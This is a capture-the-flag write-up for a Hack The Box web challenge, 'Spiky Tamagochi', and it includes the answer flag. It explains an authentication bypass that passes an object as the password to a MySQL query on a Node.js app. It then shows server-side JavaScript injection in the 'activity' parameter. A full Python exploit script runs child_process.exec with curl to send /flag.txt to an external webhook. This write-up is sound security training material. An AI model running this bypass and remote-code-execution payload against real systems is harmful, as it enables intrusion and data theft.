## Spiky Tamagochi

## Challenge Author(s):

Ulysses

## Description:

Captain Spiky comes from a rare species of creatures who can only breathe underwater. During the energy-crisis war, he was captured as a war prisoner and later forced to be a Tamagotchi pet for a child of a general of nomadic tribes. He is forced to react in specific ways and controlled remotely purely for the amusement of the general's children. The Paraman crew needs to save the captain of his misery as he is potentially a great asset for the war against Draeger. Can you hack into the Tamagotchi controller to rescue the captain?



# Target: docker ip on demand

## Difficulty/Points: 350/easy

## Flag: HTB{3sc4p3d_bec0z_n0_typ3_ch3ck5}


## Challenge

The challenge is presented with one login page and that's it. We have no login credentials.

# Solution 

The challenge solution in this case must necessarily be something related to XSS or SQLi. To find out, you have to analyse the request captured by burp and see if it is vulnerable somewhere. We can tell that it is a nodeJS application by the source code present on the web page. We can see that in the login operation it uses mysql's prepared statements without filtering. The absence of filters allows me to execute an SQLi by sending an object instead of a string, which always returns true. The payload can be constructed by embedding an object as a password instead of a string, and then we can log in as admin simply by sending the payload of an always true SQLi. After logging in, we turn to the endpoit activity, again trying to figure out with burp what to do to get the flag. We note that the use of the payload sent inside the calculation function exposed by the SpikyFactor file is not filtered by anything, so I can insert superscripts to terminate the JS code and insert code that the server will execute for me causing an RCE. The RCE works because the activity parameter handled by the web application is simply copied and pasted without filtering, and I can insert superscripts to stop the code syntax and start the syntax in the server context. There is a difference between the JS code on the client and the JS code on the server, we server that the JS is interpreted by the server which will execute bash commands for us and send the flag to our endpoint.

```python
import requests

url="http://178.62.83.221:30982"
web_hook="https://93a187a44d8aeefb2dccb39e84635adb.m.pipedream.net"

session = requests.session()

burp0_url = "{}/api/login".format(url)
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36", "Content-Type": "application/json", "Accept": "*/*", "Origin": "http://178.62.83.221:30982", "Referer": "http://178.62.83.221:30982/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
burp0_json={"password": {"password": 1}, "username": "admin"}
session.post(burp0_url, headers=burp0_headers, json=burp0_json)

burp0_url = "{}/api/activity".format(url)
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close", "Content-Type": "application/json"}
burp0_json={"activity": "asd'+process.mainModule.require('child_process').exec('curl *WEBHOOK*/$(cat /flag.txt)', (error, stdout, stderr) => {})+'".replace("*WEBHOOK*",web_hook), "happiness": "1", "health": "1", "weight": "1"}
session.post(burp0_url, headers=burp0_headers, json=burp0_json)

print("Controlla il Web Hook {}".format(web_hook))
```

the flag will be received printed in the webhook page.